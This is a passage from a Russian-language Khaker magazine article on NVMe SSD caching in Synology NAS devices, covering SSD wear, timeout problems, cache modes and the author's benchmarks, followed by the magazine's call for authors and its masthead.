очень быстро. Накопитель  будет  уплотнять данные, перезаписывая  их
в TLC/QLC‐ячей ки в режиме прос тоя.
  Поток данных не  прекраща ется. Через  короткое вре мя SLC‐буфер
переполняется, и контроллеру SSD приходится одновременно принимать
новые данные и уплотнять уже записанные. Свобод ные блоки быстро закан‐
чиваются, и к операции уплотнения добавляется операция очистки ранее
записан ных блоков — а она в таких накопителях очень медленная. Через
короткое время контроллер захлебывается, и очеред ная попыт ка записи при‐
водит к тайм‐ауту.
  Напомню, диски NVME подключаются не через контроллер SATA, который
способен самос тоятельно обработать ошибку, а напрямую к шине PCIe.
Пользователи модели DS918+ отмечали,  что  возникновение  тайм‐аута
при записи приводило к спон танной перезагрузке устройства с пос ледующей
деградаци ей как кеша, так и всего тома (кеш r/w ста новит ся его неотъемле‐
мой частью).
  Подобные ошибки отмечали пользователи раз ных моделей  Kingston
и ADATA с контроллерами SMI. Отдельные пользователи жалуются на пери‐
одические ошибки тайм‐аута с накопителями WD Black; в то же время диски
Samsung 970 Evo в возникновении этой ошибки не замече ны (впрочем, как и
любые другие диски, эти модели так же подвержены преждевременному
износу).
  Справедливости ради — я не слы шал о возникновении подобных ошибок
в устрой ствах поколения 2020 года.


Преждевременное исчерпание ресурса SSD
Пользователь DS918+ и пары Samsung 960 Evo 256GB отмечает преждевре‐
менное исчерпание ресурса SSD. На SSD записано всего 30 Тбайт данных,
что даже отда ленно не приближается к заявленному производителем ресур‐
су. Брак? Возможно, но маловероятно: случай не единичный.
  В этом и подоб ных случаях проблема в фак торе коэффициента усиления
записи (write ampliﬁcation), а точнее — несовпадение оптимального для SSD
сценария работы с фактическим.
   Как извес тно, для сохранения единственного байта информации на SSD
необходимо записать целую страницу дан ных. Большинство современных
SSD‐накопителей оперирует страницами достаточно боль шого размера —
иногда в несколько мегабайт. В то же время кеширование подразумевает
работу с множеством небольших блоков данных — объемом в десятки и сот‐
ни килобайт. Запись каждого такого блока требует перезаписи целой стра‐
ницы, что приводит к тому, что контроллер вынужден перезаписывать гораздо
большие (иногда — на порядки) объемы данных, чем пос тупает снаружи.
Результат более чем логичен: диск исчерпывает заявленный производителем
ресурс, что и отображается в данных S.M.A.R.T.; DSM присваивает накопи‐
телю  соответствующий  статус, сбра сывая содержимое кеша на дис ки
и переводя кеширование в режим read‐only. Ситуация штатная и к потере
данных при водить не должна, но в реальности иногда приводит.
   Кстати: Synology DSM не позволяет использовать в качес тве кеширующего
накопителя диск, полностью исчерпавший ресурс по данным S.M.A.R.T., даже
если фак тическое состояние ячеек NAND способно выдержать десятик‐
ратный объ ем записи.


Минимизируем риски
Как избежать описанных выше проблем? Достаточно убрать факторы риска.
 1. Если твой сетевой накопитель работает в режиме 24/7, рекомендую
   использовать кеш в режиме «только для чтения». Это и безопас нее
   для сохраннос ти тво их данных, и щадит ресурс накопи теля. Если же ты
   периодически выключаешь NAS, то содержимое кеша «только для чтения»
   будет сбрасываться каждый раз при загрузке, что только добавит нагрузки
   на SSD. В таком случае может иметь смысл режим r/w, в котором содер‐
  жимое кеша переживает перезагрузку.
 2. При создании кеша в режиме  r/w раз реши использовать под кеш
   не более 70–80% объема накопителя. Контроллер SSD сможет подменять
   «гряз ные» блоки незаня тыми, что заметно увеличит скорость цикличес кой
   перезаписи и уменьшит фактор write ampliﬁcation.
 3. Откажись от использования дисков с QLC в качестве кеширующих накопи‐
   телей. Да, QLC — самая дешевая технология, но такие диски способны
   поддерживать высокую скорость записи лишь в рам ках доступного объема
   псевдо‐SLC. При исчерпа нии буфера скорость записи в ячейки рез ко
   падает. Кроме того, память QLC при постоян ной перезаписи изнашива‐
   ется замет но быстрее TLC, так что экономия в любом случае окажется
   липовой.
 4. Не используй сквозное кеширо вание последовательных операций сов‐
  местно с недоро гими NVME SSD небольшого объема. Очевидный совет,
   который тем не менее многие успешно игнорируют.
 5. По возможности используй специализированные накопители Optane (кро‐
  ме серии H). У таких накопителей проблемы с тайм‐аутами отсутствуют
   принципи ально. Другой вариант — спе циализированные NVME‐накопи‐
   тели Synology, о которых я расскажу дальше.

С подводными кам нями разобрались; можно прис тупать к экспериментам.


ТИПЫ КЕШИРОВАНИЯ: НЕОЧЕВИДНАЯ РАЗНИЦА
В акту аль ной версии DSM (ОС Synology) можно выбрать один из двух типов
кеширования: только для чте ния (read‐only — r/o) и чтения‐записи (read‐
write —  r/w). Кроме  того, доступна настройка, позволя ющая управлять
кешировани ем  опе раций  пос ледовательного  чтения‐записи  (например,
при стриминге видео или записи на диск очередной резервной копии).
По умолчанию она отключена: эффективность такого кеширования сом‐
нительна, а ресурс SSD оно способ но исчерпать в считаные недели.
   У каж дого из двух видов кеширования есть как очевидные, так и неочевид‐
ные подводные кам ни. При этом некоторые важные параметры в докумен‐
тации не упоминаются в принципе.


Кеш «только для чтения»
Все просто: один том — один NVME‐накопитель (почему нельзя использовать
один NVME SSD или зер кальную пару для кеширования двух и более томов —
загадка). Кешируются данные, которые считываются с диска как внешними
пользователями, так и запущенными на устрой стве процессами (например,
виртуальными машинами).
   Кеширование «только для чтения» обладает одной неприятной недокумен‐
тированной особенностью: содер жимое кеша сбрасывается при выключении
или перезагрузке устройства. Соответственно, если большую часть времени
твой NAS сто ит выключенным, то на эффективности этого вида кеширования
можно ставить крест: скорее всего, более‐менее заметного КПД кеш дос‐
тигнет как раз к тому моменту, ког да ты закончишь работать с NAS и отклю‐
чишь его.
  Приблизительно так выглядит КПД моего кеша «только для чтения» во вре‐
мя работы.





Чтобы опре делить эффективность кеширования, я про вел тестирова ние, син‐
хронизируя содержимое двух сетевых папок с идентичным содер жимым (чуть
больше полутора сотен тысяч файлов): идеальные условия для демонстра ции
ускорения опе раций случайного доступа.
   Вот харак терис тики сетевой папки.





Первый  раунд  тестирования,  NVME‐кеш  отсутствует.  Синхрониза ция
заняла 35 мин 23 с.





Включаю NVME‐кеш, повторяю попытку. 33 мин 7 с. Ожидаемо: кеш пуст,
заполняется в про цессе синхронизации.





Повторная  син хронизация  той же  папки  с  вклю ченным NVME‐кешем
заняла 1 мин 40 с. Полез ность этого теста сомнительна: дан ные находятся
как в кеше, так и в оперативной памяти устройства.





А что будет, если отключить NVME‐кеширование? Отключаю кеш, повторяю
синхрониза цию. 1 мин 39 с — разница в пределах погрешности. Дей стви‐
тельно, предыдущий тест оказался бесполезным — данные система бра ла
в основном из оперативной памяти, а не из кеша NVME.





Какое преимущество даст кеш «только для чтения» в этом сценарии? Прак‐
тически никако го: кеш не переживает перезагрузки, поэтому сразу пос ле
включения син хро низа ция сетевых папок будет занимать 35 мин вмес то
полутора. Точ но так же ведет себя и кеш в оперативной памяти устрой ства,
расширить которую проще и дешевле, чем возиться с кешированием
на NVME.
  В каких сценариях кеш «только для чтения» имеет смысл? Прежде все го
в    таких,   которые   под разумевают   постоянную    работу   NAS
в режиме 24/7 с преобладанием операций слу чайного доступа. Также кеш
будет полезен, если к устройству одновременно обращает ся несколь ко поль‐
зователей. Для меня же кеш в данной конфигурации оказался совершенно
бесполезным.


Кеш на чтение и запись
Начиная тестирование, я не ожидал, что кеш «только для чтения» будет сбра‐
сываться каж дый раз при загрузке устройства. Этот момент не был отражен
в документации, и я не первый, кто с удив лением обнаружил эту особенность.
С моей точки зрения, для «временного» кеширования есть оператив ная
память, а кеш на SSD должен сохранять ся между перезагрузками. Однако
моя логика не совпадает с логикой разработчиков DSM, поэтому для вклю‐
чения пос тоянного кеша при ходится активировать более опасный и менее
стабильный режим кеширования чтения‐записи.
  Важно понимать, что при включении этого режима нужно использовать
оба NVME SSD в зеркале (RAID 1); кешировать ся при этом будет единствен‐
ный том на выбор. Если в тво ей конфигурации присутс твует единственный
том для хранения данных — тебе повез ло. Если же томов несколь ко — при‐
дется выбрать, какой из них ты хочешь ускорить.
  Другая важная вещь: в режиме чтение/запись кеш на NVME становится
частью тома. Если что‐то случится с SSD или, к примеру, ты захочешь
перенести жес ткие дис ки на другое устройство, не отключив предварительно
кеш, то основной том будет пов режден. Все это в том числе и после вык‐
лючения NAS. Поэто му перед подобными операциями с дисками требует ся
отключать кеш.
  Приступаем  к  тестированию.  Число фай лов  успело изме ниться —
перед получе нием второго NVME‐накопителя прошло некоторое время.
  При создании кеша я ука зал возможность использовать в качес тве кеша
до 400 Гбайт (из 465 доступных).





Первый раунд синхрониза ции с пустым кешем не отличается по времени
от ситу ации «без кеша»; я его пропущу. После того как кеш был заполнен,
синхрониза ция сетевых папок заняла 1 мин 38 с — результат, аналогичный
предыдущему экспе рименту.





Перезагружаю устройство, чтобы убедиться в сох ранности кеша. Сразу после
загрузки запускаю синхронизацию. 3 мин 12 с! Только в этом тесте наконец
удалось уви деть разницу между производительностью кеша в оперативной
памяти и кеша на NVME.





Месяц спустя
Я внимательно наб людал за работой устройства в течение месяца. В моем
сценарии использования NAS включается три‐четыре раза в неделю с сес‐
сиями примерно на час‐два. Впрочем, статис тика SSD‐кеша позволя ет точно
узнать и количество сессий, и часы работы устрой ства за этот месяц.





Используемый объем кеша на чте ние‐запись за все время почти дос‐
тиг 24 Гбайт — при том что на устройство в течение месяца понемногу сох‐
ранялись резервные копии и отснятые фотографии. На скриншоте — актуаль‐
ное состояние кеша.





Как видим, в моем сценарии использования беспокоиться об изно се SSD
не приходит ся: ресурса должно с избытком хватить на несколько лет. Данной
конфигурацией я доволен. Вот мои наблюдения:
 1. Периоди ческая син хро низа ция папок с целью резервного копиро вания
   на порядок быстрее, чем без кеша.
 2. Доступ к фай лам ощутимо быстрее не стал: я единственный активный
   пользователь, и скорос ти жестких дисков вполне хватает.
 3. За мет но (в разы!) уменьшился шум от позиционирова ния головок дисков
   как при чтении, так и при записи данных. Диски стали работать спо кой нее,
   преобладают операции последовательного доступа, а операции случай‐
   ного доступа перехватывает и берет на себя кеш NVME.

При этом не произош ло одной ожидаемой вещи. В моей сети NAS достаточ‐
но беспокойно ведет себя в состоянии простоя, время от времени про сыпа‐
ясь просто от того, что я откры ваю на компьютере окно Explorer, на котором
отображаются в том числе и доступные сетевые пап ки.
  Я ожи дал, что NAS сможет более стабильно оста навливать вращение дис‐
ков и оставаться в сос тоянии «сна» в опи санных условиях. Если бы такое слу‐
чилось, я смог бы оставить NAS работать в режиме 24/7 (сейчас я этого
делать не хочу из‐за шума дисков). Увы, не вышло: активация NVME‐кеша
никак не повлияла на гибер нацию дисков и их периодическое включение
от любого пинга.


СПЕЦИАЛИЗИРОВАННЫЕ ДИСКИ ДЛЯ КЕШИРОВАНИЯ
Как я уже упоминал, DSM отключает кеш на чтение‐запись (и не позволя ет
больше использовать SSD для кеширования), как только уровень оставше‐
гося ресурса SSD по дан ным S.M.A.R.T. дос тигает нулевого зна чения. С уче‐
том того, что про изво дители SSD весьма консервативны, «ноль» по S.M.A.R.T.
может озна чать исчерпание менее 10% реального ресурса ячеек памяти.
Нераци онально? Возможно, но другого способа обеспечить целос тность
данных у системы нет.
  Выпуск модели DS918+ стал отличным пробным шаром. Армия неволь ных
бета‐тестеров обеспечила  Synology отчетами о проблемах и данными
телеметрии. Убедившись, что пользователи действительно не понимают осо‐
бенностей работы контроллеров SSD и принципов организации NAND
(положа руку на сердце, почему они должны это понимать?), в компании
решили  выпус тить  специализированные  для  кеширования NVME SSD
под собственным име нем.
   Что они собой представляют? Рассмот рим модель SNV3400‐400G. Фак‐
тически серия SNV3400 — ODM‐диски на контроллере Phison PS5012‐E12DC.
Найди отличия.





                      SNV3400 от Synology





                     Дженерик от Phison

В чем отличие этих накопителей для кеширования от аналогичных ODM‐
решений? В первую  очередь —  в  значении  overprovisioning:  емкость
в 400 Гбайт намекает на наличие резервного пула ячеек прос то гигантского
объема. При всем желании пользователь не сможет заставить этот диск «зах‐
лебнуться» потоком данных: страницы из подменно го фонда спокойно примут
новые дан ные, и отказа в обслуживании по тайм‐ауту не случит ся. Кроме того,
TBW накопителя на 400 Гбайт составляет 500 Тбайт. В сочетании с невысо‐
ким из‐за большого резервного пула коэффициентом усиления записи такой
заявленный ресурс позволит подобному специали зированному диску про‐
работать в качес тве кеша на чте ние‐запись заметно дольше альтернативных
решений даже при одинаковой фактической надежности NAND.
  Впрочем, если ты все‐таки понимаешь принцип работы контроллеров SSD
и NAND‐памяти и уста новишь в качес тве кеша какой‐нибудь Samsung Evo
970 на 500 Гбайт, а кеш создашь всего на 400, то резуль тат, скорее всего,
окажется не хуже, а лучше специализированного накопителя (у Samsung
мощнее контроллеры и весь ма выносливая память). Проверить это утвержде‐
ние, одна ко, я не могу: ста тис тика пока отсутствует.
  Еще один интересный вариант — использовать в качестве кеша накопи‐
телей Intel Optane (за исключением линейки H, на устройствах которой рас‐
положены два отдель ных SSD — небольшой Optane и основной объ ем QLC‐
памяти). Накопители Optane объемом 16 Гбайт можно найти за копейки: дис‐
ки такого объема мало кому инте ресны, а исполь зовать их так, как хотела Intel
(в качестве, обрати внимание, кеша для основно го диска), поль зователям
десктопов неинтересно: современные NVME SSD дают компактным Optane
фору и по объ ему, и по про изводитель ности, и по цене за гигабайт.


ЕСЛИ КЕШ БЕСПОЛЕЗЕН
Мне уда лось перестать бояться и полюбить кеш, но если для тебя он оказал‐
ся бесполезен, а SSD уже куплены и установ лены в слоты — что можно с ними
сделать?
  В устройствах от конкурентов ты мог бы создать еще один том для хра‐
нения самых час то исполь зуемых дан ных. Соот ветствующая функция давно
присутствует в QNAP, а совсем недавно появи лась в про шивке ADM
3.5.2.RAG2 (20 октября 2020‐го) и для устройств ASUSTOR с соответс тву ющи‐
ми разъ ема ми.
  В DSM 6.2 использовать накопители NVME для соз дания тома нельзя.
По слухам, в грядущем обновле нии DSM 7.0 такая функциональность должна
появиться. Но сроки выхода этого обновления неизвестны: сейчас тестиру‐
ется лишь пер вая предварительная версия.
  Впрочем, если нельзя, но очень хочет ся, то можно. В статье Use NVME
SSD as storage volume instead of cache in DS918 при водят ся подробные инс‐
трукции, как создать тома на таких накопителях. Нужно отметить, что решение
имеет огра ниченную применимость: загружаться с таких томов устройство
не будет.


ЗАКЛЮЧЕНИЕ
Кеширование с помощью NVME — одна из самых противоречивых воз‐
можностей NAS. Многочисленные программные ограниче ния, времена ми
весьма странная логика разработчиков, сомнительная эффективность кеша
в режиме «только для чтения», потенциальные риски и эксплуатация SSD
на износ в режиме чтения‐записи отвратят многих, если не большинство,
от использования этой функции. В то же время, если твой сценарий исполь‐
зования попадает в одну из несколь ких узких ниш, для которых кеширование
оправдан но, ты сможешь сделать свой NAS быстрее и тише с минимальными
усилиями.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авто ры, и ты можешь стать одним
из них! Если тебе интерес но то, о чем мы пишем, и есть
желание иссле довать эти темы вместе с нами, то не упусти
воз можность вступить в ряды наших авторов и получать
за это все, что им причита ется.


 • Àâ òîðû ïîëó÷à þò äåíåæ íîå âîç íàãðàæ äåíèå. Раз мер  зависит
   от сложности и уникаль ности темы и объема проделанной работы (но
   не от объ ема текста).
 • Íàøè àâòî ðû ÷èòà þò «Õàêåð» áåñ ïëàò íî: каж дая опуб ликованная
   статья приносит месяц подписки и зна чительно уве личивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной вер сии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâ äîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, пос тавить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соц сетях. Или,
наобо рот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Глав ное в нашем деле — знания по теме, а не короч ки журналис та. Знаешь
тему — значит, и написать смо жешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столь ко редакторов! Они не только пра вят бук вы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с авто ром все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Пер вым делом задай себе несколько прос тых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñî âàòü äðó ãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование мик ропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдет ся
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðå ìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработ ки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåò ñÿ ìíå êðó òîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîä ìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñ òèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãî âîðè ëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нес кольких
   пред ложений (pro tip: их потом мож но пус тить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно глав реду —
   он разберет ся). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сро ки сдачи чер новика. Так же он выда-
   ет тебе правила оформления и отвечает на все инте ресу ющие воп росы.
 5. Пишешь статью в срок и отправ ляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обра щаться.
 6. Редак тор чита ет статью, при нимает ее или воз вращает с прось бой
   дорабо тать и руководством к дей ствию.
 7. Пе ред пуб ликацией получаешь вер сию с правками и обсуждаешь их
   с редактором (или просто даешь доб ро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», при думай тему для первой статьи
и предложи редакции.
    №11 (260)
          Андрей Письменный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                         РЕДАКТОРЫ РУБРИК
          Андрей Письменный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чуп рова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Валентин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Воп росы по подписке: lapina@glc.ru
                            Воп росы по материалам: support@glc.ru





Адрес редакции: 125080, город Мос ква, Волоколам ское шоссе, дом 1, стро ение 1, этаж 8, помеще ние IX, ком ната 54, офис 7. Изда тель: ИП
Югай Алек сандр Оле гович, 400046, Вол гоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Мос ква, Волоколам ское шос се, дом 1, стро ение 1, этаж 8, помеще ние IX, комната 54, офис 7. Зарегис трировано в Федераль ной службе
по над зору в сфере свя зи, информацион ных тех нологий и массовых коммуника ций (Рос комнадзоре), сви детельство Эл № ФС77‐ 67001 от 30.
08.2016 года. Мне ние редак ции не обя затель но сов пада ет с мнением авторов. Все матери алы в номере пре доставляются как информация
к раз мышле нию. Лица, использующие дан ную информа цию в противозаконных целях, могут быть привлечены к ответс твенности. Редак ция
не несет ответствен ности за содер жание рек ламных объявле ний в номере. По вопросам лицен зирова ния и получе ния прав на исполь зование
редакционных материалов журнала обра щайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2020